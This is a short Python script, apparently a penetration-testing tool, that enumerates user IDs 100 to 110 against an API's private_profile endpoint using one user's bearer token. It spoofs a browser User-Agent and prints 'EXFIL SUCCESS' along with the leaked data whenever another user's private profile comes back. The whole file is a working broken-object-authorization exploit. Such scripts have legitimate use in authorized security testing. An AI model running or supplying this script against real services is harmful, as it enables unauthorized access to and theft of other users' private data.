import requests
from termcolor import colored

def test_bola_vulnerability(base_url, session_token):
    print(colored("--- COMMENCING API BOLA FUZZING ---", "blue"))
    
    headers = {
        "Authorization": f"Bearer {session_token}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ..."
    }

    # Iterate through potential User IDs (e.g., 100 to 110)
    for user_id in range(100, 111):
        target_url = f"{base_url}/api/v1/user/{user_id}/private_profile"
        response = requests.get(target_url, headers=headers)
        
        if response.status_code == 200:
            print(colored(f"[!] EXFIL SUCCESS: Data found for UID {user_id}", "green"))
            print(f"[+] Content: {response.text[:100]}...") # Print first 100 chars
        elif response.status_code == 403:
            print(f"[-] UID {user_id}: Access Forbidden (Secure)")
        else:
            print(f"[-] UID {user_id}: Status {response.status_code}")

# Usage: test_bola_vulnerability("http://mock-scam-api.io", "eyJhbG...")